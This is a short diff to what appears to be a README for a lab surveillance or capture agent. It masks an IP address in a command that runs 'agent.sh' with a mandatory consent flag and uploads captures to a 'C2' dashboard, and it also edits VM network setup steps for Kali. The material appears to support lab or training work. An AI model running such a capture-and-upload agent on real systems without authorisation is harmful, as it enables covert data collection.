@@ -41,7 +41,7 @@ Dashboard opens at: **http://localhost:5000**
 sudo bash agent.sh --consent
 
 # With C2 upload — sends to dashboard
-sudo bash agent.sh --consent --server http://192.168.153.1:5000/capture
+sudo bash agent.sh --consent --server http://xxx.xxx.xxx.x:x000/capture
 ```
 
 >  **`--consent` flag is mandatory.** The agent will not run without it.
@@ -62,7 +62,7 @@ If `ping 192.168.153.1` fails from Kali:
 
 1. VM Settings → Network Adapter
 2. Set to **NAT (VMnet8)** or **Host-only (VMnet1)**
-3. Confirm: `ping 192.168.153.1` should succeed
+3. Confirm: `ping xxx.xxx.xxx.x` should succeed
 
 ---
 
